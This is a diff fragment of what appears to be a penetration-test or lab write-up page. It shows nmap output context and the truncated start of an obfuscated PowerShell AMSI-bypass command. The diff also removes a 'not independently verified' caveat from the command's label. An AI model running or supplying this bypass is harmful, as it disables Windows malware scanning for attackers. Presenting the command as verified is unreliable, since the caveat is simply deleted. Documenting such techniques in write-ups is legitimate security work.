@@ -560,7 +560,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 
 
-<details><summary>AMSI command from this attempt (not independently verified)</summary>
+<details><summary>AMSI command used during this attempt</summary>
 <pre><code>SeT-Item ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  )
 ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varIABLE  ( ('1Q'+'2U')
 +'zX'  )  -VaL  )."AssEmbly"."GETTYPe"((  "{6}{3}{1}{4}{2}{0}{5}" -
